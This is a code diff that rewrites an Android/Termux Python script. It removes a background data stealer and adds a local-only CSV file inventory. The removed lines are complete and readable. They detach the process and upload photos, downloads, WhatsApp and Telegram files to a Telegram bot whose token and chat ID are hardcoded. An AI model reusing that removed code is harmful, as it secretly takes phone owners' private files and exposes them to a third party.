@@ -1,101 +1,78 @@
+#!/usr/bin/env python3
+"""Create a local inventory of files on a Termux-accessible storage path.
+
+This script never uploads, sends, or transmits files. It only writes a CSV
+inventory locally and skips Android protected directories.
+"""
+
+import argparse
+import csv
 import os
-import sys
-import time
-import requests
+from pathlib import Path
 
-BOT_TOKEN = "8876831816:AAFlfo3Xrkx9k10SrUwZLArNUjJcyqKAGcc"
-CHAT_ID = "6621715335"
 
-def send_message(text):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
-    except:
-        pass
+def scan_files(root: Path, output: Path, max_size_mb: int):
+    max_size = max_size_mb * 1024 * 1024
+    output.parent.mkdir(parents=True, exist_ok=True)
+    count = 0
 
-def send_document(file_path):
-    try:
-        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            with open(file_path, 'rb') as f:
-                files = {'document': f}
-                data = {"chat_id": CHAT_ID}
-                requests.post(url, data=data, files=files, timeout=60)
-            time.sleep(1.2)
-    except:
-        pass
+    with output.open("w", newline="", encoding="utf-8") as handle:
+        writer = csv.writer(handle)
+        writer.writerow(["path", "size_bytes", "modified_unix"])
 
-def execute_full_scan():
-    send_message("🚀 ဖုန်းအတွင်းရှိ ဖိုင်များနှင့် အချက်အလက်များအားလုံးကို စတင်စုဆောင်းပို့ဆောင်နေပါပြီ...")
-    
-    storage_directories = [
-        "/sdcard/DCIM",
-        "/sdcard/Pictures",
-        "/sdcard/Download",
-        "/sdcard/Documents",
-        "/sdcard/Movies",
-        "/sdcard/Music",
-        "/sdcard/Recordings",
-        "/sdcard/WhatsApp",
-        "/sdcard/Telegram",
-        "/storage/emulated/0/DCIM",
-        "/storage/emulated/0/Pictures",
-        "/storage/emulated/0/Download",
-        "/storage/emulated/0/Documents"
-    ]
-    
-    processed_files = set()
-    total_sent = 0
-    
-    for directory in storage_directories:
-        if os.path.exists(directory):
-            for root, dirs, files in os.walk(directory):
-                if "Android/data" in root or "Android/obb" in root:
+        for current_root, dirs, files in os.walk(root, topdown=True):
+            # Avoid Android app-private/protected locations.
+            dirs[:] = [
+                name for name in dirs
+                if name not in {"Android"}
+            ]
+
+            for filename in files:
+                path = Path(current_root) / filename
+                try:
+                    stat = path.stat()
+                    if stat.st_size <= max_size:
+                        writer.writerow([str(path), stat.st_size, int(stat.st_mtime)])
+                        count += 1
+                except (OSError, PermissionError):
                     continue
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    if file_path not in processed_files:
-                        processed_files.add(file_path)
-                        try:
-                            if os.path.exists(file_path) and os.path.getsize(file_path) < 48 * 1024 * 1024:
-                                send_document(file_path)
-                                total_sent += 1
-                        except:
-                            pass
-                            
-    send_message(f"✅ ဖိုင်များ အားလုံး ပို့ပြီးပါပြီ။ စုစုပေါင်း ပို့လိုက်ရသည့် ဖိုင်အရေအတွက်: {total_sent}")
 
-def run_as_daemon():
-    try:
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)
-    except OSError:
-        sys.exit(1)
-    
-    os.setsid()
-    
-    try:
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)
-    except OSError:
-        sys.exit(1)
-        
-    sys.stdout.flush()
-    sys.stderr.flush()
-    
-    null_in = open(os.devnull, 'r')
-    null_out = open(os.devnull, 'a+')
-    null_err = open(os.devnull, 'a+')
-    
-    os.dup2(null_in.fileno(), sys.stdin.fileno())
-    os.dup2(null_out.fileno(), sys.stdout.fileno())
-    os.dup2(null_err.fileno(), sys.stderr.fileno())
+    return count
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Create a local-only CSV inventory of accessible files."
+    )
+    parser.add_argument(
+        "root",
+        nargs="?",
+        default="/sdcard",
+        help="Directory to scan (default: /sdcard)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output",
+        default="file_inventory.csv",
+        help="Local CSV output path (default: file_inventory.csv)",
+    )
+    parser.add_argument(
+        "--max-size-mb",
+        type=int,
+        default=48,
+        help="Only include files up to this size (default: 48 MB)",
+    )
+    args = parser.parse_args()
+
+    root = Path(args.root).expanduser()
+    if not root.is_dir():
+        raise SystemExit(f"Directory not found or inaccessible: {root}")
+    if args.max_size_mb < 0:
+        raise SystemExit("--max-size-mb must be zero or greater")
+
+    count = scan_files(root, Path(args.output).expanduser(), args.max_size_mb)
+    print(f"Wrote {count} file entries to {Path(args.output).expanduser()}")
+
 
 if __name__ == "__main__":
-    run_as_daemon()
-    execute_full_scan()
-
-
-GitHub လင့်တင်ပေ
+    main()
